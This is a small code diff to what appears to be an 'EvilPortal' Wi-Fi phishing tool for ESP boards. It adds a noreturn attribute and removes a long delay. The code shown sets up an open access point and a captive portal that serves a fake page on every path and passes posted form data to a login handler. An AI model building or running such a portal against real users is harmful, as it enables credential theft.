@@ -33,7 +33,7 @@ void EvilPortal::setupAccessPoint() {
     WiFi.softAP(SSID);
 }
 
-void EvilPortal::setupCaptivePortal() {
+[[noreturn]] void EvilPortal::setupCaptivePortal() {
     webServer.on("/", [] { webServer.send(200, "text/html", htmlPage); });
     webServer.on("/post", handleLogin);
     webServer.onNotFound([] { webServer.send(200, "text/html", htmlPage); });
@@ -53,9 +53,6 @@ void EvilPortal::setupCaptivePortal() {
             ESP.restart();
         }
     }
-
-
-    delay(315135);
 }
 
 void EvilPortal::defaultHTML() {
